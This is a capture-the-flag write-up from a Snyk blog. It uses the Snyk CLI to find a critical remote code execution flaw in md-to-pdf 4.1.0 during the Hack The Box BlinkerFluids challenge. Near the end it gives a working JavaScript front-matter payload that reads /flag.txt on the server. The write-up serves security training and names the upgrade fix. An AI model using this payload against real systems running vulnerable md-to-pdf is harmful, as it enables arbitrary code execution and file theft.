@@ -1,0 +1,165 @@
+
+Hack The Box (HTB) is a platform that gamifies cybersecurity training. It's suitable for aspiring pen testers, as well as developers who want to become security champions — or simply understand the mindset of adversaries a bit better — in order to make their applications more secure.
+I believe in the effectiveness of gamification in training and education, because let's be honest — who doesn't know what it’s like to participate in an internal security training or study for a certification exam, and forget all that knowledge half a year later.HTB take a different approach with its hands-on, capture-the-flag (CTF) games, where players break into a machine, typically  a Linux or Windows virtual machine, by discovering and exploiting vulnerabilities, in order to catch two flags — first a regular user flag, and then the root user flag through privilege escalation. A flag is simply the content of a particular text file sitting on the machine.
+Beside "machines" (the main items of the platform) on Hack The Box, there are also smaller tasks that you can participate in, called "Challenges". These challenges are usually a bit shorter and only ask for a single flag, but often come with a complete set of resource files to download. This can be a pcap file to be analyzed with wireshark, or  the complete source code of the application in question, which allows you to analyze the structure and code of the underlying application — which is exactly where Snyk fits in.
+Snyk help you find vulnerabilities and possible entry points faster. The Snyk CLI allows you to run SAST (static application security testing) and SCA (source composition analysis) tests against your project, and scans application manifest files, such as package.json, for known vulnerabilities in open source libraries. It even points out POCs.
+BlinkerFluids challenge analysis
+The BlinkerFluids challenge is a great showcase for HTB. Since it's a fairly easy challenge and a good way to get started, I’ll use it as a demonstration in this blog post.
+Once you spin up for the challenge, you’ll get the host IP and port (46.101.2.216:32221 in this example), which when opened in a browser, will display a website with a simple interface.
+Let's see what's behind this target URL by opening http://46.101.2.216:32221.
+The application consists of a single page with a list of invoices, and the ability to export invoices as a PDF, delete them, or create new ones.
+Hovering over the PDF export link, we see that the PDFs are served from what seems to be a static assets folder.
+The editor for creating invoices seems to provide a WYSIWYG editor that takes input in markup language (Markdown), before converting it to a PDF.
+Before we analyze anything more on the actual target host, let's download the resources provided by the challenge. Downloading and extracting the zip file, we are given the complete source code of the application, a Node application packaged as a Docker image — with the Dockerfile and package.json included.
+We also see a flag.txt in the root folder. In HTB challenges, the flag generally sits at the /flag.txt path. However, the file in this zip package is just a placeholder, and not the live flag we're looking for. The HTB platform generates and rotates these flags online with their own logic. But in any case, we now know the recipe and ingredients of the BlinkerFluids app.
+1─$ tree -L 2 
+2. 
+3├── build-docker.sh 
+4├── challenge 
+5│ ├── database.js 
+6│ ├── helpers 
+7│ ├── index.js 
+8│ ├── node_modules 
+9│ ├── package.json 
+10│ ├── package-lock.json
+11│ ├── routes 
+12│ ├── static 
+13│ └── views 
+14├── config 
+15│ └── supervisord.conf 
+16├── Dockerfile 
+17└── flag.txt 
+187 directories, 8 files
+The actual application sits in the "challenge" subfolder. As we can see, there are a couple node libraries set as direct and transitive dependencies under the node_modules, and we can also see the static folder, which seems to be one serving the exported PDFs seen above.
+1╰─$ tree -L 2 
+2. 
+3├── database.js 
+4├── helpers 
+5│ └── MDHelper.js 
+6├── index.js 
+7├── node_modules 
+8│ ├── ... 
+9│ ├── marked 
+10│ ├── md-to-pdf 
+11│ ├── media-typer 
+12│ ├── ... 
+13├── package.json 
+14├── package-lock.json 
+15├── routes 
+16│ └── index.js 
+17├── static 
+18│ ├── css 
+19│ ├── images 
+20│ ├── invoices 
+21│ └── js 
+22└── views 
+23└── index.html 
+24379 directories, 7 files
+Snyk Vulnerability Scan
+Since we’re looking for a way to break into the application and capture the /flag.txt from the online instance, we can study the code in-depth to understand the logic. For the sake of time and space, I won't go into too much detail in this blog post.
+We are basically looking for vulnerabilities in either the custom code that was written, or any of the direct or indirect (transitive) dependencies.
+Now, the Snyk CLI allows us to do both. If you haven’t installed Snyk, you can do so by running:
+1npm i -g snyk
+or any other preferred way as documented on the Snyk CLI install page.
+Inside the challenge subfolder, we first run a SAST test on the custom code:
+1snyk code test
+giving us the following results:
+$ snyk code testTesting /home/mconradt/Documents/HTB/Challenges/web_blinkerfluids/challenge ...  ✗ [Medium] Cross-Site Request Forgery (CSRF)     Path: index.js, line 2     Info: Consider using csurf middleware for your Express app to protect against CSRF   attacks.  ✗ [Medium] Information Exposure     Path: index.js, line 2     Info: Disable X-Powered-By header for your Express app (consider using Helmet middleware), because it exposes information about the used framework to potential attackers.   ✗ [Medium] Allocation of Resources Without Limits or Throttling     Path: routes/index.js, line 9     Info: This endpoint handler performs a file system operation and doesnot use a rate-limiting mechanism. It may enable the attackers to perform Denial-of-service attacks. Consider using a rate-limiting middleware such as express-limit.   ✗ [High] Cross-site Scripting (XSS)     Path: static/js/main.js, line 20     Info: Unsanitized input from data from a remote resource flows into append, where it is used to dynamically construct the HTML page on client side. This may result in a DOM Based Cross-Site Scripting attack (DOMXSS). ✔ Test completedOrganization: e-corp-demo Test type: Static code analysis Project path: /home/mconradt/Documents/HTB/Challenges/web_blinkerfluids/challenge Summary:  4 total Code issues:  | 1 High | 3 Medium |
+While we do see a couple vulnerabilities, even a high severity one, there isn't anything we could leverage —  XSS doesn’t really help us in this case. So, let's continue with a SCA test.
+As part of an SCA test, Snyk analyzes the manifest files of a project (in case of Node.js, it's the package.json and package-lock.json).
+1$ cat package.json 
+2↵ 1 
+3{ 
+4        "name": "blinker-fluids", 
+5        "version": "1.0.0", 
+6        "description": "", 
+7        "main": "index.js", 
+8        "scripts": { 
+9                "start": "node index.js" 
+10        }, 
+11        "keywords": [], 
+12        "author": "rayhan0x01", 
+13        "license": "ISC", 
+14        "dependencies": { 
+15                "express": "4.17.3", 
+16                "md-to-pdf": "4.1.0", 
+17                "nunjucks": "3.2.3", 
+18                "sqlite-async": "1.1.3", 
+19                "uuid": "8.3.2" 
+20        }, 
+21        "devDependencies": { 
+22                "nodemon": "^1.19.1" 
+23        } 
+24}
+While we only have 5 direct dependencies in the package.json, there are actually a total of 371 when we include the transitive dependencies, as we can see from the package-lock.json.  That's a lot of vulnerabilities to check manually. Let’s run:
+1$ npm install 
+2$ snyk test
+We get the following results:
+1$ snyk test
+2
+3Testing
+4/home/mconradt/Documents/HTB/Challenges/web_blinkerfluids/challenge...
+5
+6Tested 286 dependencies for known issues, found 4 issues, 11 vulnerable paths. 
+7
+8Issues to fix by upgrading: 
+9
+10  Upgrade md-to-pdf@4.1.0 to md-to-pdf@5.0.2 to fix 
+11  ✗ Regular Expression Denial of Service (ReDoS) [Medium Severity]  [https://security.snyk.io/vuln/SNYK-JS-MARKED-2342073] in marked@2.1.3 introduced by md-to-pdf@4.1.0 > marked@2.1.3 
+12  ✗ Regular Expression Denial of Service (ReDoS) [Medium Severity] [https://security.snyk.io/vuln/SNYK-JS-MARKED-2342082] in marked@2.1.3 introduced by md-to-pdf@4.1.0 > marked@2.1.3 
+13  ✗ Remote Code Execution (RCE) [Critical Severity] 
+14[https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880] in md-to pdf@4.1.0 
+15    introduced by md-to-pdf@4.1.0 
+16
+17Issues with no direct upgrade or patch: 
+18  ✗ Regular Expression Denial of Service (ReDoS) [High Severity] [https://security.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908] in ansi regex@2.1.1 
+19    introduced by md-to-pdf@4.1.0 > listr@0.14.3 > listr-update renderer@0.5.0 > strip-ansi@3.0.1 > ansi-regex@2.1.1 and 7 other path(s) This issue was fixed in versions: 3.0.1, 4.1.1, 5.0.1, 6.0.1 
+20
+21Organization: e-corp-demo 
+22Package manager: npm 
+23Target file: package-lock.json 
+24Project name: blinker-fluids 
+25Open source: no 
+26Project path: 
+27/home/mconradt/Documents/HTB/Challenges/web_blinkerfluids/challenge 
+28Licenses: enabled
+Now, this looks better. We can ignore the ReDoS issues, as causing a service outage would not help us get access to the platform. But the critical Remote Code Execution (RCE) in the md-to-pdf issue looks very promising, exactly what we need. We can assume that the md-to-pdf is the helper library used to convert the invoice markdown into a PDF.
+Here we can really see the power of Snyk. It analyzed the project dependencies in seconds, points out the vulnerabilities, and even provides a link to the  Snyk Vulnerability Database — including an exploit PoC as well as links to the original issue report:
+This information will help with the exploit, but it's worth noting that Snyk's report also provides a recommendation for how to fix the issue, as you can see from the above screenshot, so it's really actionable advice.
+1How to fix? 
+2Upgrade md-to-pdf to version 5.0.0 or higher.
+But since we're now in the role of the attacker, let's check out the original Github issue for more information.
+As pointed out in the Github issue, the problem is the library gray-matter (used by md-to-pdf to parse front matter) exposing a JS-engine by default. This essentially runs eval on the given Markdown, allowing any arbitrary Javascript to be executed by anyone in control of the Markdown content.
+We can see the original PoC and also further down in the comments a slightly modified PoC.
+This PoC attempts to list and print a directory. Since we're interested in the content of the flag sitting at /flag.txt, we leverage this with a slight modification, reading the content of the flag file:
+1---js 
+2{ 
+3  css: `body::before { content: 
+4"${require('fs').readFileSync('/flag.txt')}"; display: block }`, } 
+5---
+Pasting this code in the invoice generator and hitting save will provide us with a PDF that holds the flag we're after.
+Submit this flag and the challenge is solved. Off to the next one :)
+Become a CTF champion with Snyk
+Hack The Box challenges are a fun way to learn about vulnerabilities and their exploitation. Snyk helped us solve this Hack The Box challenge by quickly analyzing application dependencies, and pointing out a critical RCE vulnerability with information on how to exploit it. It also provided information for the application developer on how to remediate the issue.
+Save the date: Snyk will be hosting "Fetch the Flag CTF" on November 9. Make sure to register and join the fun with 16 challenges waiting for you.
+Get started in capture the flag
+Learn how to solve capture the flag challenges by watching our virtual 101 workshop on demand.
+
+About the Author
+Mathias Conradt is an entrepreneur and cybersecurity professional with a software engineering and pre-sales background, a Snyk Ambassador, and the DevSecCon Germany Chapter Lead. He is also a CTF Player. Check out his personal website here.
+flag.txt
+/flag.txt
+node_modules
+static
+/flag.txt
+challenge
+package.json
+package-lock.json
+package.json
+package-lock.json
+Remote Code Execution (RCE)
+md-to-pdf
+md-to-pdf
+gray-matter
+md-to-pdf
+/flag.txt
